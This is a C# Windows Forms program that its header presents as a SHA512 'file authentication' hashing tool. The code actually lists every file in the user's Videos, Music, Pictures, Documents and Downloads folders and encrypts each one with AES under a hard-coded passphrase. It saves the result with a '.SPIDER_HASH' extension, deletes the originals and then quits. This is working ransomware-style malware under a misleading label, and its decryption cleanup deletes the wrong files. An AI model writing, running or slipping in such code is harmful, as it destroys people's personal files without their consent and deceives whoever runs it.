using Spiders;
using System;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Windows.Forms;

namespace SPIDERS_UMBRELLA_CORPORATION
{
    /// <summary>
    /// SPIDERS "UMBRELLA CORPORATION": (SHA512-HASHING: FILE AUTHENTICATION)
    /// CREATED BY JUSTIN LINWOOD ROSS | COPYRIGHT: JANUARY 2025
    /// HASH ALL FILES/SUB-FOLDERS IN NUMEROUS DIRECTORIES
    /// THIS APPLICATION COMES WITH COMPLETE ERROR HANDLING (PROPERLY)
    /// </summary>
    public partial class Form1 : Form
    {
        #region Constants and DllImports

        // Constants for form positioning and volume control
        private const int SWP_NOMOVE = 0x2; // FORM POSITION
        private const int SWP_NOSIZE = 0x1; // FORM POSITION
        private const int HWND_TOPMOST = -1; // FORM POSITION
        private const uint WM_APPCOMMAND = 0x319; // VOLUME CONTROL
        private const uint APPCOMMAND_VOLUME_UP = 0xA; // VOLUME CONTROL

        public static uint WM_APPCOMMAND1 => WM_APPCOMMAND;

        public static uint APPCOMMAND_VOLUME_UP1 => APPCOMMAND_VOLUME_UP;

        // DllImports for Windows API calls
        [DllImport("user32.dll")]
        private static extern short GetAsyncKeyState(Keys vKey);

        [DllImport("user32")]
        private static extern bool SetWindowPos(IntPtr hWnd, int hWndInsertAfter, int X, int Y, int cx, int cy, int uFlags);

        [DllImport("user32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        private static extern IntPtr SendMessage(IntPtr hWnd, uint Msg, IntPtr wParam, IntPtr lParam);

        #endregion

        #region Constructor and Form Events

        public Form1()
        {
            InitializeComponent();
            // Assign event handlers in constructor for cleaner separation
            Load += Form1_Load;
            timer1.Tick += Timer1_Tick;
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            try
            {
                InitializeProgressBars();
                SetWindowToTopMost();

                // *** REMOVED: Administrator check and restart logic ***
                // The application will now run with the privileges of the launching user.
                // Ensure the app.manifest is set to <requestedExecutionLevel level="asInvoker" />
                LoadFilesFromSpecialFolders();
            }
            catch (Exception ex)
            {
                LogError("Error in Form1_Load", ex);
            }
        }

        #endregion

        #region Administrative and UI Setup

        // *** REMOVED: RestartAsAdministrator() method ***
        // *** REMOVED: IsUserAdministrator() method ***

        /// <summary>
        /// Initializes the progress bars with their maximum and minimum values.
        /// </summary>
        private void InitializeProgressBars()
        {
            try
            {
                progressBar1.Maximum = 100;
                progressBar1.Minimum = 0;
                // PBM_SETSTATE message (1040) - 2 for normal, 3 for error, 1 for paused
                SendMessage(progressBar1.Handle, 1040, (IntPtr)2, IntPtr.Zero);

                progressBar2.BackColor = Color.Red; // Note: BackColor might not be directly visible depending on ProgressBar style
                progressBar2.Maximum = 100; // Changed to 100 for percentage
                progressBar2.Minimum = 0;
                SendMessage(progressBar2.Handle, 1040, (IntPtr)3, IntPtr.Zero); // Set to error state initially
            }
            catch (Exception ex)
            {
                LogError("Error initializing progress bars", ex);
            }
        }

        /// <summary>
        /// Sets the main window to be always on top.
        /// </summary>
        private void SetWindowToTopMost()
        {
            try
            {
                SetWindowPos(Handle, HWND_TOPMOST, 0, 0, 0, 0, SWP_NOMOVE | SWP_NOSIZE);
            }
            catch (Exception ex)
            {
                LogError("Error setting window to topmost", ex);
            }
        }

        #endregion

        #region File Loading and Processing

        /// <summary>
        /// Loads files from predefined special folders into the SPIDER_WEB ListBox.
        /// </summary>
        private void LoadFilesFromSpecialFolders()
        {
            try
            {
                // Using the enum from NativeMethods for clarity
                NativeMethods.ShellSpecialFolders[] specialFolders = {
                    NativeMethods.ShellSpecialFolders.Videos,
                    NativeMethods.ShellSpecialFolders.Music,
                    NativeMethods.ShellSpecialFolders.Pictures,
                    NativeMethods.ShellSpecialFolders.Documents,
                    NativeMethods.ShellSpecialFolders.Downloads
                };

                foreach (NativeMethods.ShellSpecialFolders folder in specialFolders)
                {
                    string folderPath = NativeMethods.GetSpecialFolder(folder);
                    if (!string.IsNullOrEmpty(folderPath) && Directory.Exists(folderPath))
                    {
                        LoadFilesFromFolder(folderPath);
                    }
                    else
                    {
                        // Log this as a warning if the folder isn't accessible, rather than an error
                        // since the app no longer requests admin rights.
                        Debug.WriteLine($"Warning: Could not retrieve or access special folder: {folder}. It might require elevated privileges or not exist.");
                        LogError($"Could not retrieve or access special folder: {folder}", null);
                    }
                }
            }
            catch (Exception ex)
            {
                LogError("Error loading files from special folders", ex);
            }
        }

        /// <summary>
        /// Loads files from a specified folder and its subdirectories, excluding ".SPIDER_HASH" files.
        /// </summary>
        /// <param name="folderPath">The path to the folder to load files from.</param>
        private void LoadFilesFromFolder(string folderPath)
        {
            try
            {
                // Use Directory.EnumerateFiles for potentially large directories to avoid loading all paths into memory at once
                var files = Directory.EnumerateFiles(folderPath, "*.*", SearchOption.AllDirectories)
                                     .Where(file => !file.EndsWith(".SPIDER_HASH", StringComparison.OrdinalIgnoreCase));

                foreach (string foundFile in files)
                {
                    // Ensure UI updates are on the UI thread if this method is called from a non-UI thread
                    if (SPIDER_WEB.InvokeRequired)
                    {
                        SPIDER_WEB.Invoke(new Action(() => SPIDER_WEB.Items.Add(foundFile)));
                    }
                    else
                    {
                        SPIDER_WEB.Items.Add(foundFile);
                    }
                }
            }
            catch (UnauthorizedAccessException ex)
            {
                // This is expected if the app isn't running as admin and tries to access protected folders.
                // Log as a warning rather than a critical error.
                Debug.WriteLine($"Warning: Access denied to folder: {folderPath}. Skipping.");
                LogError($"Access denied to folder: {folderPath}", ex);
            }
            catch (PathTooLongException ex)
            {
                LogError($"Path too long for folder: {folderPath}", ex);
            }
            catch (Exception ex)
            {
                LogError($"Error loading files from folder: {folderPath}", ex);
            }
        }

        #endregion

        #region Cryptography

        /// <summary>
        /// Computes the SHA512 hash of an input string.
        /// </summary>
        /// <param name="input">The string to hash.</param>
        /// <returns>The SHA512 hash as a hexadecimal string.</returns>
        /// <exception cref="ArgumentException">Thrown if the input is null or empty.</exception>
        /// <exception cref="InvalidOperationException">Thrown if an error occurs during hashing.</exception>
        public string ComputeSha512Hash(string input)
        {
            if (string.IsNullOrWhiteSpace(input))
            {
                throw new ArgumentException("Input cannot be null or empty.", nameof(input));
            }

            try
            {
                using (SHA512 sha512 = SHA512.Create())
                {
                    byte[] bytes = Encoding.UTF8.GetBytes(input);
                    byte[] hash = sha512.ComputeHash(bytes);
                    return BitConverter.ToString(hash).Replace("-", "").ToLowerInvariant();
                }
            }
            catch (CryptographicException ex)
            {
                throw new InvalidOperationException("Error during hashing.", ex);
            }
        }

        /// <summary>
        /// Generates a cryptographic key from a passphrase using SHA512.
        /// </summary>
        /// <param name="passphrase">The passphrase to derive the key from.</param>
        /// <returns>A 32-byte (256-bit) key.</returns>
        /// <remarks>
        /// WARNING: This method of key derivation is not recommended for production.
        /// Use a proper Password-Based Key Derivation Function (PBKDF) like PBKDF2, scrypt, or Argon2.
        /// </remarks>
        public byte[] Guardian(string passphrase)
        {
            try
            {
                byte[] hashData = Encoding.UTF8.GetBytes(passphrase);

                using (SHA512 sha512 = SHA512.Create())
                {
                    byte[] hashResult = sha512.ComputeHash(hashData);
                    byte[] key = new byte[32]; // AES-256 requires a 32-byte key
                    Array.Copy(hashResult, key, key.Length);
                    return key;
                }
            }
            catch (Exception ex)
            {
                throw new ApplicationException($"An error occurred in Guardian function: {ex.Message}", ex);
            }
        }

        /// <summary>
        /// Generates an Initialization Vector (IV) from a passphrase using SHA512.
        /// </summary>
        /// <param name="passphrase">The passphrase to derive the IV from.</param>
        /// <returns>A 16-byte (128-bit) IV.</returns>
        /// <remarks>
        /// WARNING: This method of IV derivation is not recommended for production.
        /// IVs should generally be random and unique for each encryption operation.
        /// </remarks>
        public byte[] CreationPool(string passphrase)
        {
            try
            {
                byte[] hashData = Encoding.UTF8.GetBytes(passphrase);
                byte[] iv = new byte[16]; // AES requires a 16-byte IV

                using (SHA512 sha512 = SHA512.Create())
                {
                    byte[] result = sha512.ComputeHash(hashData);
                    // Take bytes from the middle of the hash to create the IV
                    // This is a simplification; a truly random IV is preferred.
                    Array.Copy(result, 32, iv, 0, iv.Length);
                }

                return iv;
            }
            catch (Exception ex)
            {
                throw new ApplicationException($"An error occurred in CreationPool function: {ex.Message}", ex);
            }
        }

        /// <summary>
        /// Defines the cryptographic action to perform.
        /// </summary>
        public enum CryptoAction
        {
            HashEncrypt = 1,
            HashDecrypt = 2
        }

        /// <summary>
        /// Performs encryption or decryption of a file.
        /// </summary>
        /// <param name="inputFilePath">The path of the input file.</param>
        /// <param name="outputFilePath">The path of the output file.</param>
        /// <param name="key">The encryption/decryption key.</param>
        /// <param name="iv">The initialization vector.</param>
        /// <param name="action">The cryptographic action (encrypt or decrypt).</param>
        public void HashPassage(string inputFilePath, string outputFilePath, byte[] key, byte[] iv, CryptoAction action)
        {
            FileStream filterInput = null;
            FileStream filterOutput = null;
            CryptoStream cryptoStream = null;

            try
            {
                filterInput = new FileStream(inputFilePath, FileMode.Open, FileAccess.Read);
                filterOutput = new FileStream(outputFilePath, FileMode.OpenOrCreate, FileAccess.Write);
                filterOutput.SetLength(0); // Ensure output stream is empty

                // Reset and set ProgressBar2 maximum
                progressBar2.Invoke(new Action(() =>
                {
                    progressBar2.Value = 0;
                    progressBar2.Maximum = 100; // Set maximum to 100 for percentage
                }));

                cryptoStream = CreateCryptoStream(filterOutput, key, iv, action);
                ProcessFile(filterInput, cryptoStream);

                Debug.WriteLine($"{((action == CryptoAction.HashEncrypt) ? "Encryption" : "Decryption")} Complete for: {inputFilePath}");
            }
            catch (FileNotFoundException ex)
            {
                LogError($"File not found: {inputFilePath}", ex);
                HandleFileDeletion(action, inputFilePath, outputFilePath); // Attempt cleanup on error
            }
            catch (IOException ex)
            {
                LogError($"I/O error during HASH_PASSAGE for {inputFilePath}", ex);
                HandleFileDeletion(action, inputFilePath, outputFilePath); // Attempt cleanup on error
            }
            catch (CryptographicException ex)
            {
                LogError($"Cryptographic error during HASH_PASSAGE for {inputFilePath}", ex);
                HandleFileDeletion(action, inputFilePath, outputFilePath); // Attempt cleanup on error
            }
            catch (Exception ex)
            {
                LogError($"Unhandled error during HASH_PASSAGE for {inputFilePath}", ex);
                HandleFileDeletion(action, inputFilePath, outputFilePath); // Attempt cleanup on error
            }
            finally
            {
                // Ensure all streams are closed and disposed
                cryptoStream?.Dispose();
                filterOutput?.Dispose();
                filterInput?.Dispose();

                // Only delete original file on successful encryption
                if (action == CryptoAction.HashEncrypt && File.Exists(outputFilePath))
                {
                    File.Delete(inputFilePath);
                }
                // Only delete the encrypted file on successful decryption
                else if (action == CryptoAction.HashDecrypt && File.Exists(inputFilePath))
                {
                    File.Delete(outputFilePath); // Assuming decrypting removes the .SPIDER_HASH file
                }
            }
        }

        /// <summary>
        /// Creates a CryptoStream for encryption or decryption.
        /// </summary>
        /// <param name="outputStream">The output FileStream.</param>
        /// <param name="key">The cryptographic key.</param>
        /// <param name="iv">The initialization vector.</param>
        /// <param name="action">The cryptographic action.</param>
        /// <returns>A configured CryptoStream.</returns>
        private CryptoStream CreateCryptoStream(FileStream outputStream, byte[] key, byte[] iv, CryptoAction action)
        {
            RijndaelManaged rijndaelCryptography = new RijndaelManaged
            {
                KeySize = 256,
                BlockSize = 128,
                Mode = CipherMode.CBC, // Common and secure mode
                Padding = PaddingMode.PKCS7, // Standard padding
                Key = key,
                IV = iv
            };

            ICryptoTransform transform = (action == CryptoAction.HashEncrypt)
                ? rijndaelCryptography.CreateEncryptor()
                : rijndaelCryptography.CreateDecryptor();

            return new CryptoStream(outputStream, transform, CryptoStreamMode.Write);
        }

        /// <summary>
        /// Processes a file by reading from an input stream and writing to a crypto stream.
        /// </summary>
        /// <param name="inputStream">The input FileStream.</param>
        /// <param name="cryptoStream">The CryptoStream for writing.</param>
        private void ProcessFile(FileStream inputStream, CryptoStream cryptoStream)
        {
            long lengthProtocol = inputStream.Length;
            long runningCountByteProcess = 0;
            byte[] blockByte = new byte[4096]; // Buffer size

            int currentByteProcessed;
            while ((currentByteProcessed = inputStream.Read(blockByte, 0, blockByte.Length)) > 0)
            {
                cryptoStream.Write(blockByte, 0, currentByteProcessed);

                runningCountByteProcess += currentByteProcessed;

                // Update ProgressBar2 on the UI thread
                if (progressBar2.InvokeRequired)
                {
                    progressBar2.Invoke(new Action(() =>
                    {
                        progressBar2.Value = (int)((double)runningCountByteProcess / lengthProtocol * 100);
                    }));
                }
                else
                {
                    progressBar2.Value = (int)((double)runningCountByteProcess / lengthProtocol * 100);
                }
            }
        }

        /// <summary>
        /// Handles the deletion of files based on the cryptographic action.
        /// This is intended for cleanup after an error or successful operation.
        /// </summary>
        /// <param name="action">The cryptographic action performed.</param>
        /// <param name="inputFilePath">The path to the source file (original file for encryption, encrypted for decryption).</param>
        /// <param name="outputFilePath">The path to the destination file (encrypted for encryption, decrypted for decryption).</param>
        private void HandleFileDeletion(CryptoAction action, string inputFilePath, string outputFilePath)
        {
            try
            {
                if (action == CryptoAction.HashEncrypt)
                {
                    // If encryption failed, the .SPIDER_HASH file might be incomplete/corrupt.
                    // If target file was partially created, delete it.
                    if (File.Exists(outputFilePath))
                    {
                        File.Delete(outputFilePath); // Delete partial encrypted file
                        Debug.WriteLine($"Deleted partial encrypted file: {outputFilePath}");
                    }
                    // Do NOT delete the original 'inputFilePath' if encryption failed, keep it safe.
                }
                else if (action == CryptoAction.HashDecrypt)
                {
                    // If decryption failed, the original .SPIDER_HASH file should remain intact.
                    // If target file was partially created, delete it.
                    if (File.Exists(inputFilePath)) // Corrected: This should be the target of the decryption (the new, decrypted file)
                    {
                        File.Delete(inputFilePath); // Delete partial decrypted file
                        Debug.WriteLine($"Deleted partial decrypted file: {inputFilePath}");
                    }
                    // Do NOT delete the encrypted 'outputFilePath' if decryption failed, keep it safe.
                }
            }
            catch (Exception ex)
            {
                LogError($"Error during file deletion cleanup for action {action}", ex);
            }
        }


        #endregion

        #region Timer and Progress Logic

        private void Timer1_Tick(object sender, EventArgs e)
        {
            try
            {
                UpdateProgressBar1Maximum();

                if (IsProgressComplete())
                {
                    timer1.Stop();
                    Application.Exit();
                }
                else
                {
                    ProcessSelectedItem();
                    // Ensure ProgressBar1 value doesn't exceed its maximum
                    if (progressBar1.Value < progressBar1.Maximum)
                    {
                        progressBar1.Increment(1);
                    }
                }
            }
            catch (Exception ex)
            {
                LogError("Error in Timer1_Tick", ex);
            }
        }

        /// <summary>
        /// Updates the maximum value of ProgressBar1 based on the number of items in SPIDER_WEB.
        /// </summary>
        private void UpdateProgressBar1Maximum()
        {
            // Ensure UI updates are on the UI thread
            if (progressBar1.InvokeRequired)
            {
                progressBar1.Invoke(new Action(() => progressBar1.Maximum = SPIDER_WEB.Items.Count));
            }
            else
            {
                progressBar1.Maximum = SPIDER_WEB.Items.Count;
            }
        }

        /// <summary>
        /// Checks if the overall progress is complete.
        /// </summary>
        /// <returns>True if ProgressBar1 value equals its maximum; otherwise, false.</returns>
        private bool IsProgressComplete()
        {
            // Ensure UI updates are on the UI thread for checking
            if (progressBar1.InvokeRequired)
            {
                return (bool)progressBar1.Invoke(new Func<bool>(() => progressBar1.Value == progressBar1.Maximum));
            }
            else
            {
                return progressBar1.Value == progressBar1.Maximum;
            }
        }

        /// <summary>
        /// Processes the currently selected item in the SPIDER_WEB ListBox.
        /// This involves encrypting the file.
        /// </summary>
        private void ProcessSelectedItem()
        {
            // Ensure UI updates/accesses are on the UI thread
            if (SPIDER_WEB.InvokeRequired)
            {
                SPIDER_WEB.Invoke(new Action(ProcessSelectedItemInternal));
            }
            else
            {
                ProcessSelectedItemInternal();
            }
        }

        private void ProcessSelectedItemInternal()
        {
            // Ensure index is valid before accessing
            if (progressBar1.Value >= SPIDER_WEB.Items.Count)
            {
                // This scenario means all items have been processed or an issue with indexing
                Debug.WriteLine("All items processed or index out of bounds.");
                return;
            }

            SPIDER_WEB.SelectedIndex = progressBar1.Value;
            // No need to set SelectionMode here, it's typically set once for the control.
            // SPIDER_WEB.SelectionMode = SelectionMode.One; // This should be set in designer or Form_Load

            string host = SPIDER_WEB.SelectedItem?.ToString(); // Use null-conditional operator

            if (string.IsNullOrEmpty(host))
            {
                LogError("Selected item is null or empty, skipping processing.", null);
                return;
            }

            try
            {
                // WARNING: Hardcoded passphrase. Use a secure method for key/IV derivation.
                byte[] key = Guardian("CRYPTO_IS_ETERNAL");
                byte[] iv = CreationPool("CRYPTO_IS_ETERNAL");

                // Check if the file already has the hash extension before processing
                if (host.EndsWith(".SPIDER_HASH", StringComparison.OrdinalIgnoreCase))
                {
                    Debug.WriteLine($"Skipping already hashed file: {host}");
                    return;
                }

                // If the file is successfully encrypted, the original file will be deleted by HashPassage
                HashPassage(host, $"{host}.SPIDER_HASH", key, iv, CryptoAction.HashEncrypt);
            }
            catch (Exception ex)
            {
                LogError($"Error processing item: {host}", ex);
            }
        }

        #endregion

        #region Error Handling and Logging

        /// <summary>
        /// Logs an error message to the Debug output.
        /// </summary>
        /// <param name="message">The error message.</param>
        /// <param name="ex">The exception that occurred (can be null).</param>
        private void LogError(string message, Exception ex)
        {
            Debug.WriteLine($"{message}: {ex?.Message}");
            // In a real application, you might also log to a file, database, or display a user-friendly message.
        }

        #endregion
    }
}

namespace Spiders // Separate namespace for NativeMethods as originally implied
{
    #region Native Methods and Shell Folders

    public static class NativeMethods
    {
        // GUID for the KnownFolder API.
        // It's important to use the correct GUIDs for each special folder.
        [DllImport("shell32.dll")]
        private static extern int SHGetKnownFolderPath(
            [MarshalAs(UnmanagedType.LPStruct)] Guid rfid,
            uint dwFlags,
            IntPtr hToken,
            out IntPtr pszPath); // Use 'out' for output parameters

        /// <summary>
        /// Enumeration of common Windows shell special folders.
        /// </summary>
        public enum ShellSpecialFolders
        {
            Downloads,
            Music,
            Pictures,
            Videos,
            Documents
        }

        // Mappings from ShellSpecialFolders enum to their respective Known Folder GUIDs.
        private static readonly Guid[] ShellFolderGuids = {
            new Guid("374DE290-123F-4565-9164-39C4925E467B"), // Downloads
            new Guid("4BD8D571-6D19-48D3-BE97-422220080E43"), // Music
            new Guid("33E28130-4E1E-4676-835A-98395C3BC3BB"), // Pictures
            new Guid("18989B1D-99B5-455B-841C-AB7C74E4DDFC"), // Videos
            new Guid("FDD39AD0-238F-46AF-ADB4-6C85480369C7")  // Documents
        };

        /// <summary>
        /// Retrieves the file system path of a known folder.
        /// </summary>
        /// <param name="folder">The ShellSpecialFolders enum value.</param>
        /// <returns>The path to the special folder, or an error message if retrieval fails.</returns>
        public static string GetSpecialFolder(ShellSpecialFolders folder)
        {
            IntPtr pszPath = IntPtr.Zero;
            try
            {
                uint SHFlag = 0x4000; // KF_FLAG_DEFAULT_PATH (default) or KF_FLAG_NO_ALIAS
                int ret = SHGetKnownFolderPath(ShellFolderGuids[(int)folder], SHFlag, IntPtr.Zero, out pszPath);

                if (ret == 0) // S_OK
                {
                    return Marshal.PtrToStringUni(pszPath);
                }
                else
                {
                    return HandleError(ret);
                }
            }
            catch (Exception ex)
            {
                // Log the exception if necessary, or rethrow as a more specific exception
                Debug.WriteLine($"Error getting special folder {folder}: {ex.Message}");
                return $"Error retrieving folder path: {ex.Message}";
            }
            finally
            {
                // Free the unmanaged memory allocated by SHGetKnownFolderPath
                if (pszPath != IntPtr.Zero)
                {
                    Marshal.FreeCoTaskMem(pszPath);
                }
            }
        }

        /// <summary>
        /// Provides a human-readable error message for SHGetKnownFolderPath return codes.
        /// </summary>
        /// <param name="errorCode">The HRESULT error code.</param>
        /// <returns>A descriptive error message.</returns>
        private static string HandleError(int errorCode)
        {
            // Common HRESULT values for SHGetKnownFolderPath
            switch (errorCode)
            {
                case unchecked((int)0x80070001): // E_INVALIDARG (0x80070057 in VB's equivalent often)
                    return "Invalid argument provided to API call.";
                case unchecked((int)0x80070002): // HRESULT_FROM_WIN32(ERROR_FILE_NOT_FOUND)
                    return "The specified file or folder was not found.";
                case unchecked((int)0x80070003): // HRESULT_FROM_WIN32(ERROR_PATH_NOT_FOUND)
                    return "The specified path does not exist.";
                case unchecked((int)0x80004005): // E_FAIL (Generic failure)
                    return "An unspecified error occurred with the API call.";
                case unchecked((int)0x80070005): // E_ACCESSDENIED
                    return "Access denied to the specified folder.";
                default:
                    return $"An unknown error occurred (Error Code: {errorCode}).";
            }
        }

        /// <summary>
        /// Retrieves paths for all defined special folders.
        /// </summary>
        /// <returns>A list of strings, each representing a special folder path.</returns>
        public static System.Collections.Generic.List<string> GetAllSpecialFolders()
        {
            System.Collections.Generic.List<string> folders = new System.Collections.Generic.List<string>();
            foreach (ShellSpecialFolders folder in Enum.GetValues(typeof(ShellSpecialFolders)))
            {
                folders.Add(GetSpecialFolder(folder));
            }
            return folders;
        }
    }

    #endregion
}